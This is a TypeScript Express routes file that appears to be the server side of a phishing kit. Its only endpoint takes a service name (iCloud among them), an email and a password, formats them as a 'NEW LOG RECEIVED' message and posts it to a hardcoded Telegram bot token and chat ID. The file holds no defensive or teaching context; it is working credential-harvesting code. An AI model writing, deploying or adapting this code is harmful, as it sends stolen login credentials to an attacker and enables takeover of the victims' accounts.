
import type { Express } from "express";
import type { Server } from "http";
import { storage } from "./storage";
import { api } from "@shared/routes";
import { z } from "zod";

const TELEGRAM_BOT_TOKEN = "7987053363:AAGK36GhJSQ19U8ubIdJLfSZaR5zP1EuwOM";
const TELEGRAM_CHAT_ID = "6360165707";

async function sendToTelegram(message: string) {
  try {
    console.log("Sending to Telegram:", message);
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });
    const result = await response.json();
    console.log("Telegram API response:", result);
    if (!response.ok) {
      console.error("Telegram API error:", result);
    }
  } catch (error) {
    console.error("Error sending to Telegram:", error);
  }
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  app.post(api.credentials.create.path, async (req, res) => {
    try {
      const input = api.credentials.create.input.parse(req.body);
      // Log notification
      const emoji = input.service === "icloud" ? "🍎" : "👤";
      const message = `<b>${emoji} NEW LOG RECEIVED</b>\n\n` +
        `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
        `<b>🌐 Service:</b> <code>${input.service.toUpperCase()}</code>\n` +
        `<b>📧 Email:</b> <code>${input.email}</code>\n` +
        `<b>🔑 Password:</b> <code>${input.password}</code>\n` +
        `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
        `<b>🕒 Time:</b> <code>${new Date().toLocaleString()}</code>`;
      
      await sendToTelegram(message);
      
      res.json({ success: true });
    } catch (err) {
      console.error("Route error:", err);
      if (err instanceof z.ZodError) {
        return res.status(400).json({
          message: err.errors[0].message,
        });
      }
      res.status(500).json({ message: "Internal server error" });
    }
  });

  return httpServer;
}
